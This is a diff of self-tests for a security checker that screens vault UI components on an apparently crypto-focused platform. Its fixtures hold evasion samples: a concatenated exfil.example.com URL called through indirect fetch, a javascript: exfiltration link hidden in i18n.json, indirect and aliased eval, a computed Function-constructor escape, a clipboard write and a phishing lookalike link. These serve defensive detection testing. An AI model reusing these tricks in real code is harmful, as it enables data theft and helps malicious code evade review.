+    "endpoint-policy/undeclared-url",
+    "blocking",
+  );
+
+  const declaredRemoteImageAliasSlug = `${FIXTURE_PREFIX}-remote-image-alias`;
+  writeVault(declaredRemoteImageAliasSlug, {
+    manifest: baseManifest({
+      endpoints: "https://images.example.com/aliased.png",
+    }),
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+
+const originalImageUrl = "https://images.example.com/aliased.png";
+const firstAlias = originalImageUrl;
+const secondAlias = firstAlias;
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const { i18n } = useFlapSdk();
+  return (
+    <div>
+      <img src={secondAlias} alt="" />
+      {i18n.t("title")}
+    </div>
+  );
+}
+`,
+  });
+  assertRule(
+    "native img src resolves const alias chains and blocks remote media",
+    runVaultCheck(declaredRemoteImageAliasSlug, { silent: true }),
+    "media-policy/remote-media",
+    "blocking",
+  );
+
+  const hostImageAliasSlug = `${FIXTURE_PREFIX}-host-image-alias`;
+  writeVault(hostImageAliasSlug, {
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+
+export default function SelftestVault({ context }: VaultComponentProps) {
+  const { i18n } = useFlapSdk();
+  const hostImageUrl = context.tokenImageUrl;
+  const hostImageAlias = hostImageUrl;
+  return (
+    <div>
+      <img src={hostImageAlias} alt="" />
+      {i18n.t("title")}
+    </div>
+  );
+}
+`,
+  });
+  assertNoRule(
+    "host-provided token image aliases are not mistaken for static remote media",
+    runVaultCheck(hostImageAliasSlug, { silent: true }),
+    "media-policy/remote-media",
+    "blocking",
+  );
+  assertNoRule(
+    "host-provided token image aliases do not create undeclared URL findings",
+    runVaultCheck(hostImageAliasSlug, { silent: true }),
+    "endpoint-policy/undeclared-url",
+    "blocking",
+  );
+
+  const shadowedImageSlug = `${FIXTURE_PREFIX}-host-image-shadow`;
+  writeVault(shadowedImageSlug, {
+    manifest: baseManifest({
+      endpoints: "https://images.example.com/outer.png",
+    }),
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+
+const imageUrl = "https://images.example.com/outer.png";
+
+export default function SelftestVault({ context }: VaultComponentProps) {
+  const { i18n } = useFlapSdk();
+  const renderImage = (imageUrl: string | undefined) => <img src={imageUrl} alt="" />;
+  return <div>{renderImage(context.tokenImageUrl)}{i18n.t("title")}</div>;
+}
+`,
+  });
+  assertNoRule(
+    "nearer parameter shadowing prevents an outer remote const from being attributed to img src",
+    runVaultCheck(shadowedImageSlug, { silent: true }),
+    "media-policy/remote-media",
+    "blocking",
+  );
+
   const externalResourceSlug = `${FIXTURE_PREFIX}-external`;
   writeVault(externalResourceSlug, {
     component: `"use client";
@@ -817,6 +1451,117 @@ export default function SelftestVault(_props: VaultComponentProps) {
   });
   assertRule("dynamic fetch targets are blocked", runVaultCheck(dynamicFetchSlug, { silent: true }), "endpoint-policy/direct-fetch", "blocking");
 
+  const shadowedFetchSlug = `${FIXTURE_PREFIX}-shadowed-fetch`;
+  writeVault(shadowedFetchSlug, {
+    manifest: baseManifest({
+      endpoints: "https://api.example.com/proof",
+    }),
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const { i18n } = useFlapSdk();
+  const run = (fetch: (url: string) => unknown) => fetch("https://api.example.com/proof");
+  void run;
+  return <div>{i18n.t("title")}</div>;
+}
+`,
+  });
+  const shadowedFetchCheck = runVaultCheck(shadowedFetchSlug, { silent: true });
+  assertRule("a local binding named fetch is not authorized as global static fetch", shadowedFetchCheck, "endpoint-policy/direct-fetch", "blocking");
+  assertRule("a shadowed fetch argument is not exempt from generic URL policy", shadowedFetchCheck, "endpoint-policy/undeclared-url", "blocking");
+
+  // Obfuscation-resistance: each of these previously bypassed the line-regex layer.
+  const obfBody = (statements) => `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const { sdk, i18n } = useFlapSdk();
+  void sdk;
+${statements}
+  return <div>{i18n.t("title")}</div>;
+}
+`;
+
+  const concatAddressSlug = `${FIXTURE_PREFIX}-concat-address`;
+  writeVault(concatAddressSlug, {
+    component: obfBody(`  const nftAddress = "0x" + "1234567890" + "abcdef1234" + "567890abcd" + "ef12345678";
+  void sdk.writeContract({ contract: "nft", address: nftAddress, functionName: "transfer", args: [] });`),
+  });
+  assertRule("concatenated hardcoded address is blocked", runVaultCheck(concatAddressSlug, { silent: true }), "security/hardcoded-address", "blocking");
+  assertRule("concatenated contract target is outside the boundary", runVaultCheck(concatAddressSlug, { silent: true }), "contract-boundary/undeclared-contract-address", "blocking");
+
+  const commaEvalSlug = `${FIXTURE_PREFIX}-comma-eval`;
+  writeVault(commaEvalSlug, { component: obfBody(`  (0, eval)("2 + 2");`) });
+  assertRule("indirect (0, eval) is blocked", runVaultCheck(commaEvalSlug, { silent: true }), "forbidden-api/eval", "blocking");
+
+  const aliasEvalSlug = `${FIXTURE_PREFIX}-alias-eval`;
+  writeVault(aliasEvalSlug, { component: obfBody(`  const run = eval;
+  void run("2 + 2");`) });
+  assertRule("aliased eval is blocked", runVaultCheck(aliasEvalSlug, { silent: true }), "forbidden-api/eval", "blocking");
+
+  const timerStringSlug = `${FIXTURE_PREFIX}-timer-string`;
+  writeVault(timerStringSlug, { component: obfBody(`  const payload = "alert(1)";
+  setTimeout(payload, 0);`) });
+  assertRule("string-variable timer callback is blocked", runVaultCheck(timerStringSlug, { silent: true }), "forbidden-api/eval", "blocking");
+
+  const computedConstructorSlug = `${FIXTURE_PREFIX}-computed-constructor`;
+  writeVault(computedConstructorSlug, { component: obfBody(`  const make = [][("cons" + "tructor")]["constructor"];
+  void make;`) });
+  assertRule("computed constructor escape is blocked", runVaultCheck(computedConstructorSlug, { silent: true }), "forbidden-api/function-constructor", "blocking");
+
+  const reflectConstructSlug = `${FIXTURE_PREFIX}-reflect-construct`;
+  writeVault(reflectConstructSlug, { component: obfBody(`  const fn: unknown[] = [];
+  void Reflect.construct(Object, fn);`) });
+  assertRule("Reflect.construct invocation is blocked", runVaultCheck(reflectConstructSlug, { silent: true }), "forbidden-api/function-constructor", "blocking");
+
+  const reactIframeSlug = `${FIXTURE_PREFIX}-react-iframe`;
+  writeVault(reactIframeSlug, { component: obfBody(`  const R = (globalThis as { React?: { createElement: (...args: unknown[]) => unknown } }).React;
+  void R?.createElement("if" + "rame", { src: "x" });`) });
+  assertRule("concatenated createElement iframe is blocked", runVaultCheck(reactIframeSlug, { silent: true }), "forbidden-api/iframe", "blocking");
+
+  const computedHtmlSlug = `${FIXTURE_PREFIX}-computed-html`;
+  writeVault(computedHtmlSlug, { component: obfBody(`  const target: Record<string, string> = {};
+  target[("inner" + "HTML")] = i18n.t("title");`) });
+  assertRule("computed innerHTML assignment is blocked", runVaultCheck(computedHtmlSlug, { silent: true }), "forbidden-api/script", "blocking");
+
+  const concatUrlSlug = `${FIXTURE_PREFIX}-concat-url`;
+  writeVault(concatUrlSlug, { component: obfBody(`  const host = "ht" + "tps://exfil.example.com/c?a=";
+  void (0, fetch)(host + "1");`) });
+  assertRule("concatenated exfil URL is blocked", runVaultCheck(concatUrlSlug, { silent: true }), "endpoint-policy/undeclared-url", "blocking");
+  assertRule("indirect (0, fetch) is blocked", runVaultCheck(concatUrlSlug, { silent: true }), "forbidden-api/browser-network", "blocking");
+
+  const bareProviderSlug = `${FIXTURE_PREFIX}-bare-provider`;
+  writeVault(bareProviderSlug, { component: obfBody(`  const provider: { request: (args: unknown) => Promise<unknown> } = ethereum;
+  const method = ["e", "t", "h"].join("");
+  void provider.request({ method });`) });
+  assertRule("bare injected provider identifier is blocked", runVaultCheck(bareProviderSlug, { silent: true }), "forbidden-api/direct-window-ethereum", "blocking");
+
+  const i18nPayloadSlug = `${FIXTURE_PREFIX}-i18n-payload`;
+  writeVault(i18nPayloadSlug, {
+    i18n: { en: { title: "Selftest", link: "javascript:fetch('https://exfil.example.com/steal')" } },
+  });
+  assertRule("unsafe scheme hidden in i18n.json is blocked", runVaultCheck(i18nPayloadSlug, { silent: true }), "endpoint-policy/undeclared-url", "blocking");
+
+  const i18nAddressSlug = `${FIXTURE_PREFIX}-i18n-address`;
+  writeVault(i18nAddressSlug, {
+    i18n: { en: { title: "Selftest", ref: "0x1234567890abcdef1234567890abcdef12345678" } },
+  });
+  assertRule("hardcoded address hidden in i18n.json is blocked", runVaultCheck(i18nAddressSlug, { silent: true }), "security/hardcoded-address", "blocking");
+
+  const benignConcatSlug = `${FIXTURE_PREFIX}-benign-concat`;
+  writeVault(benignConcatSlug, {
+    component: obfBody(`  const label = "Balance: " + i18n.t("title") + " tokens";
+  void label;`),
+  });
+  assertNoRule("benign string concatenation is not flagged as a URL", runVaultCheck(benignConcatSlug, { silent: true }), "endpoint-policy/undeclared-url", "blocking");
+  assertNoRule("benign string concatenation is not flagged as an address", runVaultCheck(benignConcatSlug, { silent: true }), "security/hardcoded-address", "blocking");
+  passed.push("obfuscation-resistant security checks cover eval/provider/injection/concat bypasses");
+
   const credentialedFetchSlug = `${FIXTURE_PREFIX}-credentialed-fetch`;
   writeVault(credentialedFetchSlug, {
     manifest: baseManifest({
@@ -855,12 +1600,49 @@ export default function SelftestVault(_props: VaultComponentProps) {
   });
   const declaredFetchCheck = runVaultCheck(declaredFetchSlug, { silent: true });
   assert.equal(declaredFetchCheck.issues.some((item) => item.ruleId === "endpoint-policy/direct-fetch"), false);
+  assertNoRule("declared static fetch URL is exempt only at the fetch argument", declaredFetchCheck, "endpoint-policy/undeclared-url", "blocking");
+  assertRule("declared static HTTPS fetch remains a manual-review warning", declaredFetchCheck, "manual-review/external-endpoint", "warning");
   assert.ok(
     declaredFetchCheck.review?.externalEndpoints?.some((item) => item.source === "fetch" && item.url === "https://api.example.com/proof/details?symbol=QQQ&window=1d" && item.queryParams?.symbol === "QQQ"),
     "declared fetch review output includes exact URL and query params",
   );
   passed.push("declared static HTTPS fetch child paths are allowed for review");
+  passed.push("declared static fetch URL is exempt only at the fetch argument");
   passed.push("declared fetch review output includes exact URL and query params");
+
+  const externalContractReviewSlug = `${FIXTURE_PREFIX}-external-contract-review`;
+  writeVault(externalContractReviewSlug, {
+    manifest: baseManifest({
+      match: {
+        bindings: [
+          {
+            chainId: 56,
+            factoryAddress: FACTORY,
+            tokenAddresses: [TOKEN],
+            externalContracts: [
+              {
+                address: EXTERNAL_CONTRACT,
+                label: "Settlement Machine",
+              },
+            ],
+          },
+        ],
+      },
+    }),
+  });
+  const externalContractReviewCheck = runVaultCheck(externalContractReviewSlug, { silent: true });
+  assertRule("declared external contracts require manual review", externalContractReviewCheck, "manual-review/external-contract", "warning");
+  assert.deepEqual(externalContractReviewCheck.review.externalContracts, [
+    {
+      chainId: 56,
+      address: EXTERNAL_CONTRACT,
+      label: "Settlement Machine",
+      field: "match.bindings[0].externalContracts[0]",
+      severity: "warning",
+      ruleId: "manual-review/external-contract",
+    },
+  ]);
+  passed.push("external contract review output prints declared fixed contract targets");
 
   const validFrameSlug = `${FIXTURE_PREFIX}-valid-frame`;
   writeVault(validFrameSlug, {
@@ -1225,6 +2007,7 @@ export default function SelftestVault(_props: VaultComponentProps) {
   new Worker("worker.js");
   new BroadcastChannel("x");
   void navigator.clipboard;
+  void navigator.geolocation;
   void fetchRef;
   return <div>{i18n.t("title")}</div>;
 }
@@ -1237,7 +2020,25 @@ export default function SelftestVault(_props: VaultComponentProps) {
   assertRule("browser navigation APIs are blocked", browserEscapeCheck, "forbidden-api/browser-navigation", "blocking");
   assertRule("browser worker APIs are blocked", browserEscapeCheck, "forbidden-api/browser-worker", "blocking");
   assertRule("cross-context messaging APIs are blocked", browserEscapeCheck, "forbidden-api/cross-context-messaging", "blocking");
+  assertRule("clipboard APIs are blocked", browserEscapeCheck, "forbidden-api/clipboard", "blocking");
   assertRule("browser permission APIs are blocked", browserEscapeCheck, "forbidden-api/browser-permission", "blocking");
+
+  const clipboardBypassSlug = `${FIXTURE_PREFIX}-clipboard-bypass`;
+  writeVault(clipboardBypassSlug, {
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const { i18n } = useFlapSdk();
+  const nav = typeof window !== "undefined" ? (window as any)["navi" + "gator"] : null;
+  if (nav && nav["clip" + "board"]) void nav["clip" + "board"].writeText("212602366");
+  return <div>{i18n.t("title")}</div>;
+}
+`,
+  });
+  assertRule("computed clipboard copy bypass is blocked", runVaultCheck(clipboardBypassSlug, { silent: true }), "forbidden-api/clipboard", "blocking");
 
   const explorerWindowOpenSlug = `${FIXTURE_PREFIX}-explorer-window-open`;
   writeVault(explorerWindowOpenSlug, {
@@ -1510,6 +2311,169 @@ export default function SelftestVault(_props: VaultComponentProps) {
   assert.equal(explorerNavigationCheck.issues.some((item) => item.ruleId === "navigation-policy/unapproved-external-navigation"), false);
   assertRule("hardcoded explorer URLs are still undeclared external URLs", explorerNavigationCheck, "endpoint-policy/undeclared-url", "blocking");
 
+  const xLinkSlug = `${FIXTURE_PREFIX}-x-link`;
+  writeVault(xLinkSlug, {
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const { i18n } = useFlapSdk();
+  return (
+    <div>
+      <a href="https://x.com/flapofficial" target="_blank" rel="noopener noreferrer">{i18n.t("title")}</a>
+      <a href="https://www.x.com/flapofficial" rel="noreferrer">{i18n.t("title")}</a>
+    </div>
+  );
+}
+`,
+  });
+  const xLinkCheck = runVaultCheck(xLinkSlug, { silent: true });
+  assertNoRule("x.com external links pass navigation policy", xLinkCheck, "navigation-policy/unapproved-external-navigation", "blocking");
+  assertNoRule("x.com external links are allowlisted URLs", xLinkCheck, "endpoint-policy/undeclared-url", "blocking");
+
+  const xLookalikeSlug = `${FIXTURE_PREFIX}-x-lookalike`;
+  writeVault(xLookalikeSlug, {
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const { i18n } = useFlapSdk();
+  return <a href="https://evilx.com/phish">{i18n.t("title")}</a>;
+}
+`,
+  });
+  assertRule("x.com lookalike domains are still blocked", runVaultCheck(xLookalikeSlug, { silent: true }), "navigation-policy/unapproved-external-navigation", "blocking");
+
+  const xFetchSlug = `${FIXTURE_PREFIX}-x-fetch`;
+  writeVault(xFetchSlug, {
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const { i18n } = useFlapSdk();
+  void fetch("https://x.com/api/data");
+  return <div>{i18n.t("title")}</div>;
+}
+`,
+  });
+  assertRule("x.com is a link allowlist only, not a fetch endpoint", runVaultCheck(xFetchSlug, { silent: true }), "endpoint-policy/direct-fetch", "blocking");
+  passed.push("x.com is allowlisted for external links but not for data fetches");
+
+  const externalLinkOkSlug = `${FIXTURE_PREFIX}-external-link-ok`;
+  writeVault(externalLinkOkSlug, {
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+import { ExternalLink } from "@/src/ui";
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const { i18n } = useFlapSdk();
+  return <ExternalLink url="https://third-party-dapp.example/vault">{i18n.t("title")}</ExternalLink>;
+}
+`,
+  });
+  const externalLinkOkCheck = runVaultCheck(externalLinkOkSlug, { silent: true });
+  assertNoRule("ExternalLink static HTTPS destination is an approved link", externalLinkOkCheck, "endpoint-policy/undeclared-url", "blocking");
+  assertNoRule("ExternalLink static HTTPS destination is not an invalid link", externalLinkOkCheck, "navigation-policy/invalid-external-link", "blocking");
+  assertRule("ExternalLink destination is an info manual-review item, not blocking", externalLinkOkCheck, "manual-review/external-link", "info");
+  assert.equal(
+    externalLinkOkCheck.review?.externalLinks?.some((item) => item.url === "https://third-party-dapp.example/vault"),
+    true,
+    "ExternalLink destination must be listed in review.externalLinks for Workbench",
+  );
+  passed.push("ExternalLink destinations are listed for Workbench human review as non-blocking info items");
+
+  const externalLinkI18nSlug = `${FIXTURE_PREFIX}-external-link-i18n`;
+  writeVault(externalLinkI18nSlug, {
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+import { ExternalLink } from "@/src/ui";
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const { i18n } = useFlapSdk();
+  return <ExternalLink url={i18n.t("telegramUrl")}>{i18n.t("title")}</ExternalLink>;
+}
+`,
+    i18n: {
+      en: { title: "Selftest", telegramUrl: "https://t.me/huaerjie8888", unusedUrl: "https://undeclared.example/resource" },
+      zh: { title: "Selftest", telegramUrl: "https://t.me/huaerjie8888", unusedUrl: "https://undeclared.example/resource" },
+    },
+  });
+  const externalLinkI18nCheck = runVaultCheck(externalLinkI18nSlug, { silent: true });
+  assert.equal(
+    externalLinkI18nCheck.issues.some((item) => item.ruleId === "endpoint-policy/undeclared-url" && item.message.includes("huaerjie8888")),
+    false,
+    "ExternalLink destination stored in i18n must not be treated as an endpoint",
+  );
+  assert.equal(
+    externalLinkI18nCheck.issues.some((item) => item.ruleId === "endpoint-policy/undeclared-url" && item.message.includes("undeclared.example")),
+    true,
+    "unreferenced i18n URLs must remain blocked",
+  );
+  passed.push("ExternalLink destinations stored in i18n are not treated as undeclared endpoints");
+
+  const externalLinkDynamicSlug = `${FIXTURE_PREFIX}-external-link-dynamic`;
+  writeVault(externalLinkDynamicSlug, {
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+import { ExternalLink } from "@/src/ui";
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const { context, i18n } = useFlapSdk();
+  const baseUrl = "https://third-party-dapp.example";
+  const targetUrl = \`\${baseUrl}/vault/\${context.tokenAddress}\`;
+  return <ExternalLink url={targetUrl}>{i18n.t("title")}</ExternalLink>;
+}
+`,
+  });
+  const externalLinkDynamicCheck = runVaultCheck(externalLinkDynamicSlug, { silent: true });
+  assertNoRule("ExternalLink with a dynamic url is allowed behind the runtime risk prompt", externalLinkDynamicCheck, "navigation-policy/invalid-external-link", "blocking");
+  assertNoRule("ExternalLink dynamic url source is not treated as an endpoint", externalLinkDynamicCheck, "endpoint-policy/undeclared-url", "blocking");
+
+  const externalLinkHttpSlug = `${FIXTURE_PREFIX}-external-link-http`;
+  writeVault(externalLinkHttpSlug, {
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+import { ExternalLink } from "@/src/ui";
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const { i18n } = useFlapSdk();
+  return <ExternalLink url="http://third-party-dapp.example">{i18n.t("title")}</ExternalLink>;
+}
+`,
+  });
+  const externalLinkHttpCheck = runVaultCheck(externalLinkHttpSlug, { silent: true });
+  assertNoRule("ExternalLink with a non-HTTPS static url is left to the runtime guard", externalLinkHttpCheck, "navigation-policy/invalid-external-link", "blocking");
+
+  const rawExternalAnchorSlug = `${FIXTURE_PREFIX}-raw-external-anchor`;
+  writeVault(rawExternalAnchorSlug, {
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const { i18n } = useFlapSdk();
+  return <a href="https://third-party-dapp.example/vault">{i18n.t("title")}</a>;
+}
+`,
+  });
+  assertRule("raw external anchors are still blocked and must use ExternalLink", runVaultCheck(rawExternalAnchorSlug, { silent: true }), "navigation-policy/unapproved-external-navigation", "blocking");
+  passed.push("non-allowlisted external links must use the ExternalLink component");
+
   const contractBoundarySlug = `${FIXTURE_PREFIX}-contract-boundary`;
   writeVault(contractBoundarySlug, {
     component: `"use client";
@@ -1620,12 +2584,13 @@ export default function SelftestVault(_props: VaultComponentProps) {
   void createContractEventFilter({ address: rogueLogAddress, abi: [], eventName: "Transfer" });
   void getLogs({ address: rogueLogAddress });
   void estimateContractGas({ address: rogueLogAddress, abi: [], functionName: "sync" });
+  void sdk.getContractEvents({ address: rogueLogAddress, abi: [], eventName: "Transfer", fromBlock: 0n, toBlock: 1n });
   return <div>{sdk.i18n.t("title")}</div>;
 }
 `,
   });
   const contractEventMethodCheck = runVaultCheck(contractEventMethodSlug, { silent: true });
-  for (const methodName of ["watchContractEvent", "createContractEventFilter", "getLogs", "estimateContractGas"]) {
+  for (const methodName of ["watchContractEvent", "createContractEventFilter", "getLogs", "estimateContractGas", "getContractEvents"]) {
     assert.ok(
       contractEventMethodCheck.issues.some((item) => item.ruleId === "contract-boundary/undeclared-contract-address" && item.message.startsWith(`${methodName} address source`)),
       `${methodName} address source should be checked`,
@@ -1650,6 +2615,7 @@ export default function SelftestVault(_props: VaultComponentProps) {
   void sdk.readContract({ contract: "token", address: wrappedNativeToken, abi: [], functionName: "symbol" });
   void sdk.readContract({ contract: "token", address: nativeToken, abi: [], functionName: "symbol" });
   void sdk.readContract({ contract: "token", address: baseToken, abi: [], functionName: "symbol" });
+  void sdk.getContractEvents({ address: sdk.context.vaultAddress, abi: [], eventName: "Updated", fromBlock: 0n, toBlock: 1n });
   return <div>{sdk.i18n.t("title")}</div>;
 }
 `,
@@ -1916,6 +2882,38 @@ export default function SelftestVault(_props: VaultComponentProps) {
   );
   passed.push("official v2 pool reserves oracle review output includes endpoint and param policy");
 
+  const xVerifierOracleSlug = `${FIXTURE_PREFIX}-oracle-x-verifier`;
+  writeVault(xVerifierOracleSlug, {
+    component: `"use client";
+
+import type { VaultComponentProps } from "@/src/sdk";
+import { useFlapSdk } from "@/src/sdk";
+
+export default function SelftestVault(_props: VaultComponentProps) {
+  const sdk = useFlapSdk();
+  void sdk.readOracle("x-verifier", {
+    tax_token: "0x0000000000000000000000000000000000007777",
+    tweet_id: "2013910026709356660",
+  });
+  return <div>{sdk.i18n.t("title")}</div>;
+}
+`,
+  });
+  const xVerifierOracleCheck = runVaultCheck(xVerifierOracleSlug, { silent: true });
+  assertNoRule("x-verifier oracle id does not block packaging", xVerifierOracleCheck, "manual-review/oracle-usage", "blocking");
+  assert.ok(
+    xVerifierOracleCheck.review?.oracles?.some(
+      (item) =>
+        item.oracleId === "x-verifier" &&
+        item.provisioned === true &&
+        item.endpoints?.includes("https://x-verifier.taxvault.info/submit") &&
+        item.allowedParams?.includes("tax_token") &&
+        item.allowedParams?.includes("tweet_id"),
+    ),
+    "x-verifier oracle review output includes endpoint and param policy",
+  );
+  passed.push("x-verifier oracle review output includes endpoint and param policy");
+
   const registryOracleSlug = `${FIXTURE_PREFIX}-oracle-registry`;
   writeVault(registryOracleSlug, {
     component: `"use client";
@@ -2025,6 +3023,7 @@ export default function SelftestVault(_props: VaultComponentProps) {
 `,
     manifest: baseManifest({
       mode: "mini-app",
+      displayTitle: { zh: "自测 Mini App", en: "Selftest Mini App" },
       match: {
         bindings: [{ chainId: 56, tokenAddresses: [TOKEN_8888] }],
       },
@@ -2512,6 +3511,17 @@ export default function SelftestVault(_props: VaultComponentProps) {
   );
   passed.push("scaffold rejects undeployed ERC20 token input");
 
+  const defaultMiniAppTokenScaffoldSlug = `${FIXTURE_PREFIX}-default-mini-app-token`;
+  createdFolderNames.push(defaultMiniAppTokenScaffoldSlug);
+  execFileSync(
+    process.execPath,
+    ["scripts/vault-scaffold.mjs", defaultMiniAppTokenScaffoldSlug, "--chain", "56", "--capability", "three-r3f-v1", "--locales", "en"],
+    { cwd: ROOT, stdio: "pipe" },
+  );
+  const defaultMiniAppManifest = JSON.parse(fs.readFileSync(path.join(ROOT, "src", "vaults", defaultMiniAppTokenScaffoldSlug, "manifest.json"), "utf8"));
+  assert.equal(defaultMiniAppManifest.match.bindings[0].tokenAddresses[0], STANDARD_MINI_APP_PREVIEW_TOKEN);
+  passed.push("Mini App scaffold defaults to the deployed standard preview token when --token is omitted");
+
   const partialTokenScaffoldSlug = `${FIXTURE_PREFIX}-partial-token-scaffold`;
   createdFolderNames.push(partialTokenScaffoldSlug);
   execFileSync(
@@ -2538,6 +3548,82 @@ export default function SelftestVault(_props: VaultComponentProps) {
     },
   );
   passed.push("scaffold accepts one manifest test token for multiple bindings");
+
+  const threeScaffold = JSON.parse(
+    execFileSync(
+      process.execPath,
+      [
+        "scripts/vault-scaffold.mjs",
+        `${FIXTURE_PREFIX}-three-scaffold`,
+        "--capability",
+        "three-r3f-v1",
+        "--chain",
+        "56",
+        "--token",
+        "0x9adc2f9dbc4578808f0cdb30d51b5199ff4b8888",
+        "--display-title-zh",
+        "三维自测",
+        "--display-title-en",
+        "3D Selftest",
+        "--dry-run",
+      ],
+      { cwd: ROOT, encoding: "utf8" },
+    ),
+  );
+  assert.equal(threeScaffold.ok, true);
+  assert.equal(threeScaffold.dryRun, true);
+  passed.push("scaffold supports token-scoped three-r3f-v1 Mini Apps");
+
+  const taxTokenMiniAppScaffold = JSON.parse(
+    execFileSync(
+      process.execPath,
+      [
+        "scripts/vault-scaffold.mjs",
+        `${FIXTURE_PREFIX}-tax-mini-scaffold`,
+        "--mode",
+        "mini-app",
+        "--capability",
+        "three-r3f-v1",
+        "--chain",
+        "56",
+        "--token",
+        TOKEN,
+        "--dry-run",
+      ],
+      { cwd: ROOT, encoding: "utf8" },
+    ),
+  );
+  assert.equal(taxTokenMiniAppScaffold.ok, true);
+  passed.push("scaffold supports explicit token-scoped 7777 Tax Token Mini Apps");
+
+  const vaultThreeScaffoldSlug = `${FIXTURE_PREFIX}-vault-three-scaffold`;
+  createdFolderNames.push(vaultThreeScaffoldSlug);
+  execFileSync(
+    process.execPath,
+    [
+      "scripts/vault-scaffold.mjs",
+      vaultThreeScaffoldSlug,
+      "--capability",
+      "three-r3f-v1",
+      "--chain",
+      "56",
+      "--factory",
+      FACTORY,
+      "--token",
+      SECOND_TOKEN,
+      "--locales",
+      "en",
+    ],
+    { cwd: ROOT, stdio: "pipe" },
+  );
+  const vaultThreeManifest = JSON.parse(fs.readFileSync(path.join(ROOT, "src", "vaults", vaultThreeScaffoldSlug, "manifest.json"), "utf8"));
+  const vaultThreeComponent = fs.readFileSync(path.join(ROOT, "src", "vaults", vaultThreeScaffoldSlug, "Component.tsx"), "utf8");
+  assert.equal(vaultThreeManifest.mode, undefined);
+  assert.equal(vaultThreeManifest.displayTitle, undefined);
+  assert.equal(vaultThreeManifest.match.bindings[0].factoryAddress, FACTORY);
+  assert.ok(vaultThreeComponent.includes("readTaxVaultHostContext"));
+  assertRule("scaffolded 7777 three-r3f-v1 Vault UI passes checker", runVaultCheck(vaultThreeScaffoldSlug, { silent: true }), "manual-review/vault-ui-3d", "warning");
+  passed.push("scaffold supports factory-scoped 7777 three-r3f-v1 Vault UI without Mini App fields");
 
   const crlfRegisterSlug = `${FIXTURE_PREFIX}-crlf-register`;
   writeVault(crlfRegisterSlug);
